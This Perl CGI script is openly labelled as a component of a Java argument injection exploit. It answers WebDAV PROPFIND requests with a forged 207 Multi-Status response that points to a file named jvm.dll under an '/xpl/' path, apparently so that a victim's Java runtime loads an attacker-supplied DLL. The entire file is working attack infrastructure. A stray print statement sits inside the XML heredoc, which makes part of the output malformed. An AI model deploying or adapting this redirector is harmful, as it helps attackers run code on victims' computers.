#!/usr/bin/perl

#
#  PROPFIND Redirector
# (extention to java argument injection exploit)
#

use CGI;

$q = new CGI;

$requestedmethod = $ENV{REQUEST_METHOD};


if($requestedmethod =~ "PROPFIND")
{
$pathdll = '/xpl/jvm.dll';
$bodyxml = <<XOF;
<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>$pathdll</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0132-b000-43c6e5f8d2f80"</lp1:getetag>
<lp2:executable>F</lp2:executable>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
print "url: $urlrequest;
XOF

# Send the xml
  print $q->header(-type=> 'text/xml', -status=> '207 Multi-Status' );
  print $bodyxml;
}

1;